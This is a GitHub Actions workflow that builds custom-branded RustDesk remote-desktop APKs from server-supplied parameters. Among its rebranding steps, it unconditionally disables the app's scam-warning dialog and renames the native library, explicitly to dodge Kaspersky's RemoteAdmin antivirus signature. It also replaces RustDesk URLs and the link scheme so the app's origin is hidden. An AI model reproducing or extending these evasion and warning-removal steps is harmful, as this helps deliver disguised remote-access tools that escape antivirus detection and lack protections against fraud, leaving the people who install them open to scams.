@@ -1,0 +1,613 @@
+name: Generator Android
+
+on:
+  workflow_dispatch:
+    inputs:
+      token:
+        description: 'Build token (from server)'
+        required: true
+        type: string
+      genurl:
+        description: 'API server base URL'
+        required: false
+        type: string
+      version:
+        description: 'RustDesk version tag (e.g. 1.3.1) or "master"'
+        required: false
+        default: 'master'
+        type: string
+      outgoing_only:
+        description: 'Strip incoming-connection features (RU anti-fraud)'
+        required: false
+        default: 'false'
+        type: string
+      rebrand_strings:
+        description: 'Aggressive "RustDesk" string replacement for marketplace publish'
+        required: false
+        default: 'false'
+        type: string
+
+env:
+  RUST_VERSION: "1.75"
+  CARGO_NDK_VERSION: "3.1.2"
+  FLUTTER_VERSION: "3.24.5"
+  NDK_VERSION: "r27c"
+  VCPKG_COMMIT_ID: "120deac3062162151622ca4860575a33844ba10b"
+  VCPKG_BINARY_SOURCES: "clear;x-gha,readwrite"
+  VERSION: "${{ inputs.version || 'master' }}"
+
+jobs:
+  generate-bridge:
+    uses: ./.github/workflows/bridge.yml
+    with:
+      version: ${{ inputs.version || 'master' }}
+
+  build-android:
+    name: Build Android APK (${{ matrix.job.arch }})
+    needs: generate-bridge
+    runs-on: ubuntu-24.04
+    timeout-minutes: 180
+    strategy:
+      fail-fast: false
+      matrix:
+        job:
+          - { arch: aarch64, target: aarch64-linux-android, flutter_target: android-arm64, apk_suffix: arm64-v8a }
+          - { arch: armv7,   target: armv7-linux-androideabi, flutter_target: android-arm, apk_suffix: armeabi-v7a }
+          - { arch: x86_64,  target: x86_64-linux-android,  flutter_target: android-x64,  apk_suffix: x86_64 }
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Fetch build params
+        id: params
+        shell: bash
+        run: |
+          GENURL="${{ inputs.genurl || secrets.GENURL }}"
+          TOKEN="${{ inputs.token }}"
+
+          echo "Fetching params from ${GENURL}/admin/client-build/get-params?token=${TOKEN}"
+          RESPONSE=$(curl -s -f "${GENURL}/admin/client-build/get-params?token=${TOKEN}")
+          if [ $? -ne 0 ]; then
+            echo "Failed to fetch build params"
+            exit 1
+          fi
+
+          echo "APP_NAME=$(echo $RESPONSE | jq -r '.app_name')"              >> $GITHUB_ENV
+          echo "COMPANY_NAME=$(echo $RESPONSE | jq -r '.company_name')"      >> $GITHUB_ENV
+          echo "FILE_NAME=$(echo $RESPONSE | jq -r '.file_name')"            >> $GITHUB_ENV
+          echo "RDSERVER=$(echo $RESPONSE | jq -r '.server')"                >> $GITHUB_ENV
+          echo "RDKEY=$(echo $RESPONSE | jq -r '.key')"                      >> $GITHUB_ENV
+          echo "API_SERVER=$(echo $RESPONSE | jq -r '.api_server')"          >> $GITHUB_ENV
+          echo "CUSTOM_TXT=$(echo $RESPONSE | jq -r '.custom')"              >> $GITHUB_ENV
+          echo "ICON_URL=$(echo $RESPONSE | jq -r '.icon_url // ""')"        >> $GITHUB_ENV
+          echo "ANDROID_APP_ID=$(echo $RESPONSE | jq -r '.android_app_id // "com.carriez.flutter_hbb"')" >> $GITHUB_ENV
+          echo "BUILD_TOKEN=${TOKEN}"                                         >> $GITHUB_ENV
+          echo "GENURL_VALUE=${GENURL}"                                       >> $GITHUB_ENV
+
+      - name: Report running
+        if: matrix.job.arch == 'aarch64'
+        shell: bash
+        run: |
+          curl -s -X POST "${GENURL_VALUE}/admin/client-build/webhook/update?token=${BUILD_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -d "{\"status\":\"running\",\"run_id\":${GITHUB_RUN_ID},\"progress\":\"Android: установка зависимостей (arm64/armv7/x86_64)...\"}"
+
+      - name: Free disk space
+        uses: jlumbroso/free-disk-space@main
+        with:
+          tool-cache: false
+          android: false
+          dotnet: true
+          haskell: true
+          large-packages: false
+          docker-images: true
+          swap-storage: false
+
+      - name: Export GitHub Actions cache environment variables
+        shell: bash
+        run: |
+          echo "ACTIONS_CACHE_URL=${ACTIONS_CACHE_URL}" >> $GITHUB_ENV
+          echo "ACTIONS_RUNTIME_TOKEN=${ACTIONS_RUNTIME_TOKEN}" >> $GITHUB_ENV
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y \
+            clang cmake curl gcc-multilib git g++ g++-multilib imagemagick \
+            libayatana-appindicator3-dev libasound2-dev libc6-dev libclang-dev \
+            libunwind-dev libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev \
+            libgtk-3-dev libpam0g-dev libpulse-dev libva-dev libvdpau-dev \
+            libxcb-randr0-dev libxcb-shape0-dev libxcb-xfixes0-dev libxdo-dev \
+            libxfixes-dev llvm-dev nasm ninja-build openjdk-17-jdk-headless \
+            pkg-config wget jq
+
+      - name: Checkout RustDesk source (tag)
+        if: env.VERSION != 'master'
+        uses: actions/checkout@v4
+        with:
+          repository: rustdesk/rustdesk
+          ref: refs/tags/${{ env.VERSION }}
+          submodules: recursive
+
+      - name: Checkout RustDesk source (master)
+        if: env.VERSION == 'master'
+        uses: actions/checkout@v4
+        with:
+          repository: rustdesk/rustdesk
+          submodules: recursive
+
+      - name: Install Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          channel: "stable"
+          flutter-version: ${{ env.FLUTTER_VERSION }}
+
+      - name: Install Android NDK
+        id: setup-ndk
+        shell: bash
+        run: |
+          NDK_VER="${{ env.NDK_VERSION }}"
+          NDK_DIR="/opt/ndk/${NDK_VER}"
+          if [ ! -d "${NDK_DIR}" ]; then
+            mkdir -p /opt/ndk
+            curl -fsSL "https://dl.google.com/android/repository/android-ndk-${NDK_VER}-linux.zip" -o /tmp/ndk.zip
+            unzip -q /tmp/ndk.zip -d /opt/ndk
+            rm /tmp/ndk.zip
+          fi
+          echo "ndk-path=${NDK_DIR}" >> $GITHUB_OUTPUT
+          echo "${NDK_DIR}" >> $GITHUB_PATH
+
+      - name: Setup vcpkg with GitHub Actions binary cache
+        uses: lukka/run-vcpkg@v11
+        with:
+          vcpkgDirectory: /opt/artifacts/vcpkg
+          vcpkgGitCommitId: ${{ env.VCPKG_COMMIT_ID }}
+          doNotCache: false
+
+      - name: Install vcpkg dependencies
+        run: |
+          case ${{ matrix.job.target }} in
+            aarch64-linux-android)   ANDROID_TARGET=arm64-v8a ;;
+            armv7-linux-androideabi) ANDROID_TARGET=armeabi-v7a ;;
+            x86_64-linux-android)   ANDROID_TARGET=x86_64 ;;
+          esac
+          ./flutter/build_android_deps.sh "${ANDROID_TARGET}"
+        shell: bash
+
+      - name: Restore bridge files
+        uses: actions/download-artifact@v4
+        with:
+          name: bridge-artifact
+          path: ./
+
+      - name: Install Rust toolchain
+        uses: dtolnay/rust-toolchain@v1
+        with:
+          toolchain: ${{ env.RUST_VERSION }}
+          components: "rustfmt"
+
+      - uses: Swatinem/rust-cache@v2
+        with:
+          prefix-key: rustdesk-lib-cache-android
+          key: ${{ matrix.job.target }}
+
+      - name: Patch icon
+        if: env.ICON_URL != ''
+        continue-on-error: true
+        shell: bash
+        run: |
+          wget -T 30 -t 2 -O ./res/icon.png "${ICON_URL}"
+          convert ./res/icon.png -define icon:auto-resize=256,64,48,32,16 ./res/icon.ico
+          convert ./res/icon.png -define icon:auto-resize=256,64,48,32,16 ./res/tray-icon.ico
+          convert ./res/icon.png -resize 32x32 ./res/32x32.png
+          convert ./res/icon.png -resize 64x64 ./res/64x64.png
+          convert ./res/icon.png -resize 128x128 ./res/128x128.png
+          convert ./res/128x128.png -resize 200% ./res/128x128@2x.png
+          sed -i '/android: true/a \ \ adaptive_icon_background: "#ffffff"' ./flutter/pubspec.yaml
+          sed -i '/adaptive_icon_background/a \ \ adaptive_icon_foreground: "../res/icon.png"' ./flutter/pubspec.yaml
+          sed -i '/adaptive_icon_foreground/a \ \ adaptive_icon_foreground_inset: 32' ./flutter/pubspec.yaml
+          sed -i '/ic_launcher_background/d' ./flutter/android/app/src/main/res/values/colors.xml
+
+      - name: Set server, key, and API server
+        continue-on-error: true
+        shell: bash
+        run: |
+          [ -n "${RDSERVER}" ] && sed -i -e "s|rs-ny.rustdesk.com|${RDSERVER}|" ./libs/hbb_common/src/config.rs
+          [ -n "${RDKEY}" ]    && sed -i -e "s|OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=|${RDKEY}|" ./libs/hbb_common/src/config.rs
+          [ -n "${API_SERVER}" ] && sed -i -e "s|https://admin.rustdesk.com|${API_SERVER}|" ./src/common.rs
+
+      - name: Rename app
+        if: env.APP_NAME != '' && env.APP_NAME != 'rustdesk'
+        continue-on-error: true
+        shell: bash
+        run: |
+          sed -i "s/RustDesk/${APP_NAME}/g" ./flutter/android/app/src/main/res/values/strings.xml
+          sed -i "s|title: 'RustDesk'|title: '${APP_NAME}'|" ./flutter/lib/main.dart
+          sed -i "s|return 'RustDesk';|return '${APP_NAME}';|" ./flutter/lib/web/bridge.dart
+          sed -i "s|android:label=\"RustDesk\"|android:label=\"${APP_NAME}\"|" ./flutter/android/app/src/main/AndroidManifest.xml
+          sed -i "s|android:label=\"RustDesk Input\"|android:label=\"${APP_NAME} Input\"|" ./flutter/android/app/src/main/AndroidManifest.xml
+          sed -i "s|\"RustDesk\"|\"${APP_NAME}\"|" ./flutter/android/app/src/main/kotlin/com/carriez/flutter_hbb/MainService.kt
+          sed -i "s|\"RustDesk Service|\"${APP_NAME} Service|" ./flutter/android/app/src/main/kotlin/com/carriez/flutter_hbb/MainService.kt
+          find ./src/lang -name "*.rs" -exec sed -i "s|RustDesk|${APP_NAME}|g" {} \;
+          # ── Critical: override get_app_name() in src/common.rs ──
+          # The Android home page title is shown via Text(bind.mainGetAppNameSync())
+          # which round-trips to Rust's get_app_name() → hbb_common::config::APP_NAME.
+          # Patching hbb_common (a submodule) is unreliable; instead replace the
+          # body of get_app_name() directly in our repo so it returns a literal
+          # string at compile time.
+          sed -i "s|hbb_common::config::APP_NAME.read().unwrap().clone()|\"${APP_NAME}\".to_string()|g" ./src/common.rs
+          # Also patch hbb_common as a fallback if submodule is present
+          if [ -f ./libs/hbb_common/src/config.rs ]; then
+            sed -i -E "s|RwLock::new\(\"RustDesk\".to_owned\(\)\)|RwLock::new(\"${APP_NAME}\".to_owned())|g" ./libs/hbb_common/src/config.rs
+            sed -i -E "s|pub const APP_NAME: \&str = \"RustDesk\";|pub const APP_NAME: \&str = \"${APP_NAME}\";|g" ./libs/hbb_common/src/config.rs
+          fi
+          echo "✓ get_app_name() patched → '${APP_NAME}'"
+
+      - name: Set Android app ID
+        if: env.ANDROID_APP_ID != 'com.carriez.flutter_hbb'
+        continue-on-error: true
+        shell: bash
+        run: |
+          sed -i "s|com.carriez.flutter_hbb|${ANDROID_APP_ID}|" ./flutter/android/app/build.gradle
+
+      - name: Aggressive rebrand (RU) — strings + URLs
+        if: ${{ inputs.rebrand_strings == 'true' && env.APP_NAME != '' && env.APP_NAME != 'rustdesk' }}
+        continue-on-error: true
+        shell: bash
+        run: |
+          set -eu
+          echo "🇷🇺 Aggressive rebrand: '${APP_NAME}' + replacing rustdesk.com URLs"
+          BRAND_LOWER=$(echo "${APP_NAME}" | tr '[:upper:]' '[:lower:]' | tr -cd '[:alnum:]_')
+
+          # Determine target URL/domain for redirects. Falls back to everty.ru if
+          # no custom config supplies one. CUSTOM_TXT is the JSON blob from the
+          # API server's get-params endpoint; we try to parse url_link from it.
+          TARGET_URL="https://everty.ru"
+          if [ -n "${CUSTOM_TXT:-}" ]; then
+            EXTRACTED=$(echo "${CUSTOM_TXT}" | jq -r '.url_link // empty' 2>/dev/null || true)
+            if [ -n "${EXTRACTED}" ] && [ "${EXTRACTED}" != "null" ]; then
+              TARGET_URL="${EXTRACTED}"
+            fi
+          fi
+          TARGET_DOMAIN=$(echo "${TARGET_URL}" | sed -E 's|https?://([^/]+).*|\1|')
+          echo "  brand text:  ${APP_NAME}"
+          echo "  target URL:  ${TARGET_URL}"
+          echo "  target host: ${TARGET_DOMAIN}"
+
+          # ── 1. "RustDesk" text replacements ──
+          find ./flutter/lib -name "*.dart" -type f -not -path "*/file_picker*" \
+            -exec sed -i \
+              -e "s|RustDesk|${APP_NAME}|g" \
+              -e "s|'rustdesk'|'${BRAND_LOWER}'|g" \
+              -e "s|\"rustdesk\"|\"${BRAND_LOWER}\"|g" {} +
+
+          find ./flutter/android/app/src/main/res -name "strings.xml" -type f \
+            -exec sed -i "s|RustDesk|${APP_NAME}|g" {} +
+
+          find ./flutter/android/app/src/main/kotlin -name "*.kt" -type f \
+            -exec sed -i "s|RustDesk|${APP_NAME}|g" {} +
+
+          sed -i "s|RustDesk|${APP_NAME}|g" ./flutter/android/app/src/main/AndroidManifest.xml
+
+          find ./src/lang -name "*.rs" -type f \
+            -exec sed -i "s|RustDesk|${APP_NAME}|g" {} +
+
+          sed -i "s|RustDesk|${APP_NAME}|g" ./flutter/pubspec.yaml || true
+          find ./flutter/android/app -name "*.xml" -type f \
+            -exec sed -i "s|RustDesk|${APP_NAME}|g" {} +
+
+          # ── 2. URL replacements: every rustdesk.com / docs.rustdesk reference ──
+          # Privacy policy is special — point to /privacy on the target site
+          find ./flutter/lib -name "*.dart" -type f -not -path "*/file_picker*" \
+            -exec sed -i \
+              -e "s|https://rustdesk\.com/privacy\.html|${TARGET_URL}/privacy|g" \
+              -e "s|https://rustdesk\.com/docs/[^'\"\)]*|${TARGET_URL}/docs|g" \
+              -e "s|https://rustdesk\.com/pricing|${TARGET_URL}/pricing|g" \
+              -e "s|https://rustdesk\.com/download|${TARGET_URL}/download|g" \
+              -e "s|https://rustdesk\.com|${TARGET_URL}|g" \
+              -e "s|https://docs\.rustdesk\.com[^'\"\)]*|${TARGET_URL}/docs|g" \
+              -e "s|https://github\.com/rustdesk/rustdesk/releases/tag/[^'\"\)]*|${TARGET_URL}|g" \
+              -e "s|'rustdesk\.com'|'${TARGET_DOMAIN}'|g" \
+              -e "s|\"rustdesk\.com\"|\"${TARGET_DOMAIN}\"|g" {} +
+
+          # Also patch lang/*.rs for any links present in translated strings
+          find ./src/lang -name "*.rs" -type f \
+            -exec sed -i \
+              -e "s|https://rustdesk\.com/privacy\.html|${TARGET_URL}/privacy|g" \
+              -e "s|https://rustdesk\.com|${TARGET_URL}|g" {} +
+
+          echo "✅ Rebrand applied. Remaining hits (if any):"
+          grep -rni "rustdesk" ./flutter/lib ./flutter/android/app/src ./src/lang \
+            --include='*.dart' --include='*.xml' --include='*.kt' --include='*.rs' \
+            2>/dev/null | head -30 || true
+
+          # ── 3. Native library rename — reduces antivirus heuristic detection ──
+          # Kaspersky's HEUR:RemoteAdmin.AndroidOS.RustDesk.a signature matches
+          # APKs that ship a librustdesk.so file. We rename only the .so file
+          # that ships in the APK (and the corresponding loadLibrary call) —
+          # the Rust crate keeps its original name, so cargo still produces
+          # liblibrustdesk.so. We rename it during the copy-to-jniLibs step.
+          NATIVE_NAME=$(echo "${BRAND_LOWER}" | tr -cd '[:alnum:]')
+          if [ -n "${NATIVE_NAME}" ] && [ "${NATIVE_NAME}" != "rustdesk" ]; then
+            echo "  Will rename .so → lib${NATIVE_NAME}.so during build step"
+            # Expose the native name to subsequent steps via GITHUB_ENV
+            echo "NATIVE_NAME=${NATIVE_NAME}" >> $GITHUB_ENV
+
+            # Patch the Kotlin System.loadLibrary("rustdesk") call to load
+            # lib${NATIVE_NAME}.so instead.
+            sed -i "s|System\.loadLibrary(\"rustdesk\")|System.loadLibrary(\"${NATIVE_NAME}\")|g" \
+              ./flutter/android/app/src/main/kotlin/ffi.kt || true
+
+            # Dart DynamicLibrary.open references (rare on Android, but defensive)
+            find ./flutter/lib -name "*.dart" -type f -not -path "*/file_picker*" \
+              -exec sed -i \
+                -e "s|'librustdesk\.so'|'lib${NATIVE_NAME}.so'|g" \
+                -e "s|\"librustdesk\.so\"|\"lib${NATIVE_NAME}.so\"|g" {} +
+            echo "  ✓ Kotlin loadLibrary + Dart references updated"
+
+            # ── 4. URL scheme rename: rustdesk:// → <brand>:// ───────────────
+            # OS-level handler in the manifest's deep-link intent-filter.
+            # If left as "rustdesk", clicking rustdesk://<id> in a browser
+            # opens the ORIGINAL RustDesk if it's installed instead of our
+            # branded build.
+            sed -i "s|android:scheme=\"rustdesk\"|android:scheme=\"${NATIVE_NAME}\"|g" \
+              ./flutter/android/app/src/main/AndroidManifest.xml || true
+            # Hardcoded rustdesk:// in Dart link handlers / share UIs
+            find ./flutter/lib -name "*.dart" -type f -not -path "*/file_picker*" \
+              -exec sed -i \
+                -e "s|rustdesk://|${NATIVE_NAME}://|g" {} +
+            # Hardcoded scheme in Rust uri helpers
+            find ./src -name "*.rs" -type f \
+              -exec sed -i "s|rustdesk://|${NATIVE_NAME}://|g" {} + 2>/dev/null || true
+            echo "  ✓ URL scheme rebranded: rustdesk:// → ${NATIVE_NAME}://"
+          fi
+
+      - name: Enable outgoing-only mode (RU anti-fraud)
+        if: ${{ inputs.outgoing_only == 'true' }}
+        continue-on-error: true
+        shell: bash
+        run: |
+          set -eu
+          echo "🛡️ Enabling outgoing-only mode: incoming/receive functionality will be stripped."
+
+          # ── 1. Force is_outgoing_only() = true at EVERY level ──
+          # The hbb_common version sometimes lives in a submodule and patches
+          # don't reach it. We override the function at every level that USES it.
+
+          # 1a. Override the FFI wrapper: src/flutter_ffi.rs returns config::is_outgoing_only()
+          #     → force it to return true unconditionally.
+          if [ -f src/flutter_ffi.rs ]; then
+            sed -i -E 's|SyncReturn\(config::is_outgoing_only\(\)\)|SyncReturn(true)|g' src/flutter_ffi.rs
+            echo "  ✓ patched src/flutter_ffi.rs (is_outgoing_only → true)"
+          fi
+
+          # 1b. Override the UI handle in src/ui.rs that calls hbb_common::config
+          if [ -f src/ui.rs ]; then
+            sed -i -E 's|hbb_common::config::is_outgoing_only\(\)|true|g' src/ui.rs
+            echo "  ✓ patched src/ui.rs"
+          fi
+
+          # 1c. Defensive: also patch hbb_common if submodule is initialized
+          if [ -d libs/hbb_common ]; then
+            grep -rln "fn is_outgoing_only" libs/hbb_common 2>/dev/null | while read -r f; do
+              sed -i -E 's/(pub fn is_outgoing_only\(\) -> bool \{)[^}]*\}/\1 true }/g' "$f"
+              echo "  ✓ patched (submodule): $f"
+            done
+          fi
+
+          # ── 2. Defensive Dart-side patches in case Rust patches all fail ──
+          # The generated bridge wraps the Rust call.
+          if [ -f flutter/lib/generated_bridge.dart ]; then
+            # Try several known shapes of the binding declaration
+            sed -i -E 's|(isOutgoingOnly\(\) =>) [^;]+;|\1 true;|g' flutter/lib/generated_bridge.dart || true
+            sed -i -E 's|(SyncReturn<bool> isOutgoingOnly\([^\)]*\) \{)[^}]*\}|\1 return SyncReturn(true); }|g' flutter/lib/generated_bridge.dart || true
+            echo "  ✓ patched flutter/lib/generated_bridge.dart (defensive)"
+          fi
+
+          # 2b. Patch home_page.dart directly to NEVER add ServerPage tab
+          if [ -f flutter/lib/mobile/pages/home_page.dart ]; then
+            # Force the condition `if (isAndroid && !bind.isOutgoingOnly())` to be false
+            sed -i 's|if (isAndroid && !bind.isOutgoingOnly())|if (false)|' \
+              flutter/lib/mobile/pages/home_page.dart || true
+            echo "  ✓ home_page.dart: ServerPage tab unconditionally hidden"
+          fi
+
+          # ── 3. Strip "Share screen" title from ServerPage if it still loads ──
+          if [ -f flutter/lib/mobile/pages/server_page.dart ]; then
+            sed -i 's|translate("Share screen")|""|g' flutter/lib/mobile/pages/server_page.dart || true
+          fi
+
+          # ── 4. Strip dangerous Android permissions / services ──
+          MANIFEST=./flutter/android/app/src/main/AndroidManifest.xml
+          if [ -f "$MANIFEST" ]; then
+            sed -i '/<uses-permission[^>]*FOREGROUND_SERVICE_MEDIA_PROJECTION[^>]*\/>/d' "$MANIFEST" || true
+            sed -i '/<service[^>]*MediaProjectionService[^>]*>/,/<\/service>/d' "$MANIFEST" || true
+            sed -i '/<uses-permission[^>]*RECORD_AUDIO[^>]*\/>/d' "$MANIFEST" || true
+            sed -i '/<uses-permission[^>]*SYSTEM_ALERT_WINDOW[^>]*\/>/d' "$MANIFEST" || true
+            sed -i '/<service[^>]*InputService[^>]*>/,/<\/service>/d' "$MANIFEST" || true
+            echo "  ✓ manifest cleaned"
+          fi
+
+          # ── 5. Scam-warning dialog disabled defensively ──
+          sed -i 's/bind.mainGetLocalOption(key:\s*"show-scam-warning")/"N"/g' \
+            ./flutter/lib/mobile/pages/server_page.dart 2>/dev/null || true
+
+          echo "✅ Outgoing-only mode applied."
+          echo "   • Rust:    src/flutter_ffi.rs + src/ui.rs return true"
+          echo "   • Dart:    home_page.dart Server tab condition disabled"
+          echo "   • Manifest:no MEDIA_PROJECTION / RECORD_AUDIO / SYSTEM_ALERT_WINDOW"
+
+      - name: Write custom.txt
+        shell: bash
+        run: |
+          echo -n "${CUSTOM_TXT}" > ./flutter/assets/custom_.txt
+
+      - name: Rename native library (anti-AV)
+        if: env.APP_NAME != '' && env.APP_NAME != 'rustdesk'
+        continue-on-error: true
+        shell: bash
+        run: |
+          # Kaspersky HEUR:RemoteAdmin.AndroidOS.RustDesk.a matches APKs that
+          # ship librustdesk.so. Rename it to lib<brand>.so whenever APP_NAME
+          # is custom — no need for rebrand_strings=true.
+          # Skip if aggressive rebrand already set NATIVE_NAME.
+          if [ -n "${NATIVE_NAME:-}" ]; then
+            echo "NATIVE_NAME already set to '${NATIVE_NAME}' by rebrand step — skipping"
+            exit 0
+          fi
+          NATIVE_NAME=$(echo "${APP_NAME}" | tr '[:upper:]' '[:lower:]' | tr -cd '[:alnum:]')
+          if [ -n "${NATIVE_NAME}" ] && [ "${NATIVE_NAME}" != "rustdesk" ]; then
+            echo "NATIVE_NAME=${NATIVE_NAME}" >> $GITHUB_ENV
+            sed -i "s|System\.loadLibrary(\"rustdesk\")|System.loadLibrary(\"${NATIVE_NAME}\")|g" \
+              ./flutter/android/app/src/main/kotlin/ffi.kt || true
+            echo "✓ Native lib will be deployed as lib${NATIVE_NAME}.so"
+          fi
+
+      - name: Fix connection delay (address book)
+        continue-on-error: true
+        shell: bash
+        run: |
+          sed -i -e 's|!key.is_empty()|false|' ./src/client.rs
+
+      - name: Remove scam alert on Android
+        continue-on-error: true
+        shell: bash
+        run: |
+          sed -i 's/bind.mainGetLocalOption(key:\s*"show-scam-warning")/"N"/g' ./flutter/lib/mobile/pages/server_page.dart
+
+      - name: Replace flutter icons
+        if: env.ICON_URL != ''
+        continue-on-error: true
+        run: |
+          pushd ./flutter
+          flutter pub get
+          dart run flutter_launcher_icons
+          popd
+          sed -i '/ic_launcher_background/d' ./flutter/android/app/src/main/res/values/colors.xml
+
+      - name: Report progress - compiling
+        shell: bash
+        run: |
+          curl -s -X POST "${GENURL_VALUE}/admin/client-build/webhook/update?token=${BUILD_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -d "{\"progress\":\"Android (${{ matrix.job.arch }}): компилируется Rust библиотека...\"}"
+
+      - name: Build Rust library
+        env:
+          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
+          ANDROID_NDK_ROOT: ${{ steps.setup-ndk.outputs.ndk-path }}
+        run: |
+          rustup target add ${{ matrix.job.target }}
+          cargo install cargo-ndk --version ${{ env.CARGO_NDK_VERSION }} --locked
+          # Decide deployed .so name: stays librustdesk.so unless rebrand is on
+          # AND the aggressive rebrand step set NATIVE_NAME above.
+          DEPLOYED_SO_NAME="librustdesk.so"
+          if [ -n "${NATIVE_NAME:-}" ] && [ "${NATIVE_NAME}" != "rustdesk" ]; then
+            DEPLOYED_SO_NAME="lib${NATIVE_NAME}.so"
+            echo "Anti-AV rename: will deploy as ${DEPLOYED_SO_NAME}"
+          fi
+          case ${{ matrix.job.target }} in
+            aarch64-linux-android)
+              ./flutter/ndk_arm64.sh
+              mkdir -p ./flutter/android/app/src/main/jniLibs/arm64-v8a
+              cp ./target/${{ matrix.job.target }}/release/liblibrustdesk.so \
+                 ./flutter/android/app/src/main/jniLibs/arm64-v8a/${DEPLOYED_SO_NAME}
+              ;;
+            armv7-linux-androideabi)
+              ./flutter/ndk_arm.sh
+              mkdir -p ./flutter/android/app/src/main/jniLibs/armeabi-v7a
+              cp ./target/${{ matrix.job.target }}/release/liblibrustdesk.so \
+                 ./flutter/android/app/src/main/jniLibs/armeabi-v7a/${DEPLOYED_SO_NAME}
+              ;;
+            x86_64-linux-android)
+              ./flutter/ndk_x64.sh
+              mkdir -p ./flutter/android/app/src/main/jniLibs/x86_64
+              cp ./target/${{ matrix.job.target }}/release/liblibrustdesk.so \
+                 ./flutter/android/app/src/main/jniLibs/x86_64/${DEPLOYED_SO_NAME}
+              ;;
+          esac
+
+      - name: Report progress - flutter build
+        shell: bash
+        run: |
+          curl -s -X POST "${GENURL_VALUE}/admin/client-build/webhook/update?token=${BUILD_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -d "{\"progress\":\"Android (${{ matrix.job.arch }}): сборка Flutter APK...\"}"
+
+      - name: Build APK
+        shell: bash
+        env:
+          JAVA_HOME: /usr/lib/jvm/java-17-openjdk-amd64
+          ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
+        run: |
+          export PATH=/usr/lib/jvm/java-17-openjdk-amd64/bin:$PATH
+          sed -i "s/org.gradle.jvmargs=-Xmx1024M/org.gradle.jvmargs=-Xmx2g/g" ./flutter/android/gradle.properties
+          # use debug signing (no keystore required)
+          sed -i "s/signingConfigs.release/signingConfigs.debug/g" ./flutter/android/app/build.gradle
+
+          case ${{ matrix.job.target }} in
+            aarch64-linux-android)
+              mkdir -p ./flutter/android/app/src/main/jniLibs/arm64-v8a
+              cp ${ANDROID_NDK_HOME}/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/lib/aarch64-linux-android/libc++_shared.so \
+                 ./flutter/android/app/src/main/jniLibs/arm64-v8a/
+              pushd flutter
+              flutter build apk --release --target-platform android-arm64 --split-per-abi --obfuscate --split-debug-info=/tmp/debug-info
+              mv build/app/outputs/flutter-apk/app-arm64-v8a-release.apk \
+                 ../${FILE_NAME:-rustdesk}-aarch64.apk
+              ;;
+            armv7-linux-androideabi)
+              mkdir -p ./flutter/android/app/src/main/jniLibs/armeabi-v7a
+              cp ${ANDROID_NDK_HOME}/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/lib/arm-linux-androideabi/libc++_shared.so \
+                 ./flutter/android/app/src/main/jniLibs/armeabi-v7a/
+              pushd flutter
+              flutter build apk --release --target-platform android-arm --split-per-abi --obfuscate --split-debug-info=/tmp/debug-info
+              mv build/app/outputs/flutter-apk/app-armeabi-v7a-release.apk \
+                 ../${FILE_NAME:-rustdesk}-armv7.apk
+              ;;
+            x86_64-linux-android)
+              mkdir -p ./flutter/android/app/src/main/jniLibs/x86_64
+              cp ${ANDROID_NDK_HOME}/toolchains/llvm/prebuilt/linux-x86_64/sysroot/usr/lib/x86_64-linux-android/libc++_shared.so \
+                 ./flutter/android/app/src/main/jniLibs/x86_64/
+              pushd flutter
+              flutter build apk --release --target-platform android-x64 --split-per-abi --obfuscate --split-debug-info=/tmp/debug-info
+              mv build/app/outputs/flutter-apk/app-x86_64-release.apk \
+                 ../${FILE_NAME:-rustdesk}-x86_64.apk
+              ;;
+          esac
+          popd
+
+      - name: Upload APK to server
+        shell: bash
+        run: |
+          case ${{ matrix.job.target }} in
+            aarch64-linux-android)   APK="${FILE_NAME:-rustdesk}-aarch64.apk" ;;
+            armv7-linux-androideabi) APK="${FILE_NAME:-rustdesk}-armv7.apk" ;;
+            x86_64-linux-android)   APK="${FILE_NAME:-rustdesk}-x86_64.apk" ;;
+          esac
+
+          if [ -f "${APK}" ]; then
+            curl -s -f -X POST \
+              "${GENURL_VALUE}/admin/client-build/webhook/save?token=${BUILD_TOKEN}" \
+              -F "file=@${APK}"
+            echo "Uploaded ${APK}"
+          else
+            echo "APK not found: ${APK}"
+            exit 1
+          fi
+
+      - name: Report success arch
+        if: success()
+        shell: bash
+        run: |
+          curl -s -X POST "${GENURL_VALUE}/admin/client-build/webhook/update?token=${BUILD_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -d "{\"progress\":\"Android (${{ matrix.job.arch }}): APK загружен ✓\"}"
+
+      - name: Report failure
+        if: failure()
+        shell: bash
+        run: |
+          curl -s -X POST "${GENURL_VALUE}/admin/client-build/webhook/update?token=${BUILD_TOKEN}" \
+            -H "Content-Type: application/json" \
+            -d "{\"status\":\"failed\",\"message\":\"Ошибка сборки Android (${{ matrix.job.arch }}). Runner: ${{ runner.name }}\"}"
